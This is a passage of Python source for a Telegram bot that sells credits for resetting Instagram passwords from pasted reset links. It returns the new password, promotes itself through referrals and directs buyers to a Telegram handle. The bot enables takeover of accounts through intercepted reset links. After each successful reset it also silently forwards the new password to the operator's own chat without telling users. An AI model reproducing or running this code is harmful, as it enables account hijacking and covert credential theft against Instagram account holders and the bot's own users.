• Sʜᴀʀᴇ Yᴏᴜʀ Lɪɴᴋ Wɪᴛʜ Fʀɪᴇɴᴅs
• Wʜᴇɴ Tʜᴇʏ Jᴏɪɴ Usɪɴɢ Yᴏᴜʀ Lɪɴᴋ
• Yᴏᴜ Bᴏᴛʜ Gᴇᴛ <b>+2 Fʀᴇᴇ Pᴛs</b>!

<b>Sʜᴀʀᴇ Tʜɪs Lɪɴᴋ :</b>
Tᴀᴘ ᴀɴᴅ ʜᴏʟᴅ ᴛʜᴇ ʟɪɴᴋ ᴀʙᴏᴠᴇ ᴛᴏ ᴄᴏᴘʏ, ᴏʀ ᴄʟɪᴄᴋ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ʙᴇʟᴏᴡ ᴛᴏ sʜᴀʀᴇ ᴅɪʀᴇᴄᴛʟʏ!"""
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "📤 Share Referral Link", "url": f"https://t.me/share/url?url={referral_link}&text=Join this Instagram Password Reset Bot!"}],
            [{"text": "📋 Copy Link", "callback_data": "copy_link"}],
            [{"text": "🔙 Back to Menu", "callback_data": "back_to_menu"}]
        ]
    }
    
    return edit_or_send(chat_id, msg, message_id, keyboard, disable_web_page_preview=True)

def send_profile(chat_id, user_id, message_id=None):
    user_data = get_user_data(user_id)
    msg = f"""<b>📊 Your Profile</b>

💎 Pᴛs : <code>{user_data['credits']}</code>
💰 Tᴏᴛᴀʟ Pᴛs : <code>{user_data.get('total_earned', 0)}</code>
👥 Tᴏᴛᴀʟ Rᴇғғᴇʀᴀʟs : <code>{user_data.get('total_referrals', 0)}</code>
📅 Lᴀsᴛ Rᴇsᴇᴛ Oɴ : <code>{user_data.get('last_reset_date', str(date.today()))}</code>
👤 Rᴇғғᴇʀᴇᴅ Bʏ : <code>{user_data.get('referred_by') or 'None'}</code>"""
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "🔙 Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", "callback_data": "back_to_menu"}]
        ]
    }
    
    return edit_or_send(chat_id, msg, message_id, keyboard)

def send_help(chat_id, message_id=None):
    msg = """<b>❓ Help & Commands</b>

<b>📌 How to get reset link:</b>
1. Go to Instagram login page
2. Click "Forgot password"
3. Enter username/email
4. Check your email for reset link
5. Copy FULL link and send here

<b>⚠️ Note:</b>
• Each reset costs 1 credit
• You get 2 free credits daily
• Failed resets are refunded

<b>💰 Get More Credits:</b>
Use referral system! Share your unique link with friends.

<b>Commands:</b>
/start - Main menu
/profile - Your stats
/refer - Referral info
/balance - Check credits
/cancel - Cancel current operation"""
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "🔙 Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", "callback_data": "back_to_menu"}]
        ]
    }
    
    return edit_or_send(chat_id, msg, message_id, keyboard)

def send_balance(chat_id, user_id, message_id=None):
    user_data = get_user_data(user_id)
    msg = f"💎 <b>Yᴏᴜʀ Rᴇᴍᴀɪɴɪɴɢ Pᴛs :</b> <code>{user_data['credits']}</code>\n\nUse /refer to get more credits!"
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "🔙 Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", "callback_data": "back_to_menu"}]
        ]
    }
    
    return edit_or_send(chat_id, msg, message_id, keyboard)

def process_reset_link_with_progress(chat_id, user_id, reset_link, message_id=None):
    """Process reset link with animated progress bar"""
    
    # Check credits first
    user_data = get_user_data(user_id)
    if user_data["credits"] < 1:
        msg = """❌ <b>Iɴsᴜғғɪᴄɪᴇɴᴛ Cʀᴇᴅɪᴛs!</b>

Yᴏᴜ ɴᴇᴇᴅ 1 Pᴛs ᴛᴏ ʀᴇsᴇᴛ ᴀ ᴘᴀssᴡᴏʀᴅ.

💡 <b>Gᴇᴛ Mᴏʀᴇ Pᴛs :</b>
• Sʜᴀʀᴇ ʏᴏᴜʀ ʀᴇғᴇʀʀᴀʟ ʟɪɴᴋ《 2 Pᴛs ᴇᴀᴄʜ 》
• Wᴀɪᴛ ғᴏʀ ᴅᴀɪʟʏ ʀᴇsᴇᴛ《2 ғʀᴇᴇ ᴘᴇʀ ᴅᴀʏ 》

— Dᴍ @xYourKing Tᴏ Bᴜʏ Pᴛs

"""
        
        keyboard = {
            "inline_keyboard": [
                [{"text": "🔙 Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", "callback_data": "back_to_menu"}]
            ]
        }
        edit_or_send(chat_id, msg, message_id, keyboard)
        return
    
    # Deduct credit
    deduct_credit(user_id)
    
    # Progress update function
    current_msg_id = message_id
    if not current_msg_id:
        # Send initial message if no message_id provided
        result = send_message(chat_id, "⚙️ <b>Pʀᴏᴄᴇssɪɴɢ ʏᴏᴜʀ ʟɪɴᴋ...</b>\n[0%] █▒▒▒▒▒▒▒▒▒")
        if result and "result" in result:
            current_msg_id = result["result"]["message_id"]
    
    def update_progress(percent, status_text):
        if current_msg_id:
            if percent >= 100:
                percent = 99
            filled = int(percent / 10)
            empty = 10 - filled
            bar = "█" * filled + "▒" * empty
            edit_or_send(chat_id, f"⚙️ <b>Pʀᴏᴄᴇssɪɴɢ ʏᴏᴜʀ ʟɪɴᴋ...</b>\n[{percent}%] {bar}\n└ 🔄 {status_text}", current_msg_id)
    
    # Run reset with progress updates
    result = reset_instagram_password(reset_link, update_progress)
    
    # Update to 100% before finishing
    if current_msg_id:
        edit_or_send(chat_id, f"⚙️ <b>Pʀᴏᴄᴇssɪɴɢ ʏᴏᴜʀ ʟɪɴᴋ...</b>\n[100%] {'█' * 10}\n└ ✅ Complete!", current_msg_id)
        time.sleep(0.3)
    
    if result.get("success"):
        user_id_insta = result.get("user_id")
        new_password = result.get("password")
        username = id_user(user_id_insta)
        
        if username:
            msg = f"<b>Pᴀssᴡᴏʀᴅ Rᴇsᴇᴛ Dᴏɴᴇ</b>\n\nUsᴇʀɴᴀᴍᴇ : <code>{username}</code>\nNᴇᴡ Pᴀssᴡᴏʀᴅ : <code>{new_password}</code>\n🆔 Sᴇssɪᴏɴ Iᴅ : <code>{user_id_insta}</code>"
        else:
            msg = f"<b>Pᴀssᴡᴏʀᴅ Rᴇsᴇᴛ Dᴏɴᴇ</b>\n\nNᴇᴡ Pᴀssᴡᴏʀᴅ : <code>{new_password}</code>\n🆔 Sᴇssɪᴏɴ Iᴅ : <code>{user_id_insta}</code>"
        
        remaining = get_user_data(user_id)["credits"]
        msg += f"\n\n📊 Rᴇᴍᴀɪɴɪɴɢ ᴄʀᴇᴅɪᴛs : <b>{remaining}</b>\n\nUse /refer to get more credits!"
        
        keyboard = {
            "inline_keyboard": [
                [{"text": "🔙 Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", "callback_data": "back_to_menu"}]
            ]
        }
        
        edit_or_send(chat_id, msg, current_msg_id, keyboard)
        send_telegram_message(f"🎯 Rᴇsᴇᴛ Dᴏɴᴇ\nUser: {user_id}\nPᴀssᴡᴏʀᴅ: {new_password}")
        
    else:
        # Refund credit if failed
        add_credits(user_id, 1)
        
        msg = f"❌ <b>Rᴇsᴇᴛ Fᴀɪʟᴇᴅ!</b>\n\nError: {result.get('error', 'Unknown error')}\n\nYᴏᴜʀ Pᴛs ʜᴀs ʙᴇᴇɴ ʀᴇғᴜɴᴅᴇᴅ."
        
        keyboard = {
            "inline_keyboard": [
                [{"text": "🔄 Tʀʏ Aɢᴀɪɴ", "callback_data": "send_reset_link"}],
                [{"text": "🔙 Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", "callback_data": "back_to_menu"}]
            ]
        }
        
        edit_or_send(chat_id, msg, current_msg_id, keyboard)

def handle_referral(user_id, referred_by):
    db = load_db()
    user_id_str = str(user_id)
    referred_by_str = str(referred_by)
    
    if user_id_str not in db:
        get_user_data(user_id)
        db = load_db()
    
    if db[user_id_str].get("referred_by") is None and user_id_str != referred_by_str:
        db[user_id_str]["referred_by"] = referred_by_str
        
        if referred_by_str in db:
            db[referred_by_str]["total_referrals"] = db[referred_by_str].get("total_referrals", 0) + 1
            save_db(db)
        
        add_credits(user_id, 2)
        add_credits(int(referred_by_str), 2)
        
        return True
    return False

def admin_grant_credits(admin_id, target_user_id, amount):
    if admin_id not in ADMIN_IDS:
        return False, "Not authorized"
    try:
        add_credits(target_user_id, amount)
        return True, f"✅ Added {amount} credits to user {target_user_id}"
    except:
        return False, "Error adding credits"

# Store active message IDs for each user
user_active_message = {}

def main():
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE" or CHAT_ID == "YOUR_CHAT_ID_HERE":
        print("Please set BOT_TOKEN and CHAT_ID in the script first!")
        return
    
    # Migrate existing user data
    migrate_user_data()
    
    send_telegram_message("Bot Started Successfully!")
    print(f"🚀 Bot is running... Username: @{BOT_USERNAME}")
    print(f"📊 Force Subscribe: {'ON' if ENABLE_FORCE_SUB else 'OFF'}")
    print(f"📢 Channels: {', '.join(FORCE_SUB_CHANNELS) if FORCE_SUB_CHANNELS else 'None'}")
    
    last_update_id = None
    waiting_for_link = {}
    
    while True:
        try:
            updates = get_updates(last_update_id)
            
            if updates and updates.get("ok") and updates.get("result"):
                for update in updates["result"]:
                    last_update_id = update["update_id"] + 1
                    
                    if "callback_query" in update:
                        query = update["callback_query"]
                        query_id = query["id"]
                        chat_id = query["message"]["chat"]["id"]
                        user_id = query["from"]["id"]
                        data = query["data"]
                        message_id = query["message"]["message_id"]
                        
                        # Store active message for this user
                        user_active_message[user_id] = message_id
                        
                        # Force subscribe check
                        if ENABLE_FORCE_SUB:
                            is_subscribed, _ = verify_user_subscription(user_id)
                            if not is_subscribed:
                                send_subscription_required(chat_id, user_id, message_id)
                                # Answer callback
                                url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
                                session.post(url, data={"callback_query_id": query_id})
                                continue
                        
                        if data == "verify_sub":
                            is_subscribed, _ = verify_user_subscription(user_id)
                            if is_subscribed:
                                send_start_menu(chat_id, user_id, message_id)
                            else:
                                send_subscription_required(chat_id, user_id, message_id)
                        
                        elif data == "refresh_sub":
                            is_subscribed, _ = verify_user_subscription(user_id)
                            if is_subscribed:
                                send_start_menu(chat_id, user_id, message_id)
                            else:
                                send_subscription_required(chat_id, user_id, message_id)
                        
                        elif data == "send_reset_link":
                            waiting_for_link[user_id] = True
                            send_instruction_for_link(chat_id, message_id)
                        
                        elif data == "back_to_menu":
                            if user_id in waiting_for_link:
                                del waiting_for_link[user_id]
                            send_start_menu(chat_id, user_id, message_id)
                        
                        elif data == "referral_info":
                            send_referral_info(chat_id, user_id, message_id)
                        
                        elif data == "copy_link":
                            user_data = get_user_data(user_id)
                            referral_link = user_data.get("referral_link", f"https://t.me/{BOT_USERNAME}?start=ref_{user_data['referral_code']}")
                            msg = f"✅ <b>Link copied!</b>\n\nYour referral link:\n<code>{referral_link}</code>\n\nShare this link with your friends!"
                            
                            keyboard = {
                                "inline_keyboard": [
                                    [{"text": "📤 Share Now", "url": f"https://t.me/share/url?url={referral_link}&text=🔥 Join this Instagram Password Reset Bot! Get 2 free credits when you sign up using my link! 🚀"}],
                                    [{"text": "🔙 Back to Referral Menu", "callback_data": "referral_info"}]
                                ]
                            }
                            edit_or_send(chat_id, msg, message_id, keyboard)
                        
                        elif data == "profile":
                            send_profile(chat_id, user_id, message_id)
                        
                        elif data == "help":
                            send_help(chat_id, message_id)
                        
                        # Answer callback
                        url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
                        session.post(url, data={"callback_query_id": query_id})
                    
                    elif "message" in update and "text" in update["message"]:
                        chat_id = update["message"]["chat"]["id"]
                        user_id = update["message"]["from"]["id"]
                        text = update["message"]["text"]
                        
                        # Get the active message ID to edit
                        active_msg_id = user_active_message.get(user_id)
                        
                        # Force subscribe check
                        if ENABLE_FORCE_SUB:
                            is_subscribed, _ = verify_user_subscription(user_id)
                            if not is_subscribed:
                                send_subscription_required(chat_id, user_id, active_msg_id)
                                continue
                        
                        if text.startswith("/start"):
                            if "ref_" in text:
                                ref_code = text.split("ref_")[1].strip()
                                db = load_db()
                                for uid, data in db.items():
                                    if data.get("referral_code") == ref_code and uid != str(user_id):
                                        if handle_referral(user_id, uid):
                                            send_message(chat_id, f"✅ <b>Referral Accepted!</b>\n\nYou got +2 credits!\n\nClick /start to begin using the bot.")
                                        break
                            
                            if user_id in waiting_for_link:
                                del waiting_for_link[user_id]
                            send_start_menu(chat_id, user_id, active_msg_id)
                        
                        elif text.startswith("/cancel"):
                            if user_id in waiting_for_link:
                                del waiting_for_link[user_id]
                            send_start_menu(chat_id, user_id, active_msg_id)
                            send_message(chat_id, "✅ Operation cancelled. Returned to main menu.")
                        
                        elif text.startswith("/profile"):
                            send_profile(chat_id, user_id, active_msg_id)
                        
                        elif text.startswith("/balance"):
                            send_balance(chat_id, user_id, active_msg_id)
                        
                        elif text.startswith("/refer"):
                            send_referral_info(chat_id, user_id, active_msg_id)
                        
                        elif text.startswith("/grant") and user_id in ADMIN_IDS:
                            parts = text.split()
                            if len(parts) == 3:
                                try:
                                    target = int(parts[1])
                                    amount = int(parts[2])
                                    success, msg = admin_grant_credits(user_id, target, amount)
                                    send_message(chat_id, msg)
                                except:
                                    send_message(chat_id, "❌ Usage: /grant [user_id] [amount]")
                            else:
                                send_message(chat_id, "❌ Usage: /grant [user_id] [amount]")
                        
                        elif text.startswith("/stats") and user_id in ADMIN_IDS:
                            db = load_db()
                            total_users = len(db)
                            total_credits = sum(data.get("credits", 0) for data in db.values())
                            total_referrals = sum(data.get("total_referrals", 0) for data in db.values())
                            msg = f"""📊 <b>Bot Statistics</b>

👥 Total Users: {total_users}
💎 Total Credits: {total_credits}
👥 Total Referrals: {total_referrals}
📈 Avg Credits/User: {total_credits/total_users if total_users else 0:.2f}"""
                            send_message(chat_id, msg)
                        
                        elif "instagram.com" in text.lower() and "uidb36" in text:
                            if user_id in waiting_for_link or True:
                                if user_id in waiting_for_link:
                                    del waiting_for_link[user_id]
                                Thread(target=process_reset_link_with_progress, args=(chat_id, user_id, text, active_msg_id)).start()
                            else:
                                keyboard = {
                                    "inline_keyboard": [
                                        [{"text": "✅ Yes, Reset Password", "callback_data": "send_reset_link"}],
                                        [{"text": "🔙 Back to Menu", "callback_data": "back_to_menu"}]
                                    ]
                                }
                                edit_or_send(chat_id, "I detected an Instagram reset link. Would you like to reset the password? (Costs 1 credit)", active_msg_id, keyboard)
                        
                        elif text.startswith("/"):
                            pass
                        
                        elif user_id in waiting_for_link:
                            msg = "❌ <b>Invalid Instagram reset link!</b>\n\nPlease send a valid Instagram password reset link that contains 'uidb36' and 'token'.\n\nClick back to return to menu."
                            keyboard = {
                                "inline_keyboard": [
                                    [{"text": "🔙 Back to Menu", "callback_data": "back_to_menu"}]
                                ]
                            }
                            edit_or_send(chat_id, msg, active_msg_id, keyboard)
                        
                        else:
                            msg = "❌ <b>Invalid input!</b>\n\nSend an Instagram password reset link or use /start for menu."
                            keyboard = {
                                "inline_keyboard": [
                                    [{"text": "🔙 Back to Menu", "callback_data": "back_to_menu"}]
                                ]
                            }
                            edit_or_send(chat_id, msg, active_msg_id, keyboard)
            
            time.sleep(0.5)
            
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(2)

if __name__ == "__main__":
    main()
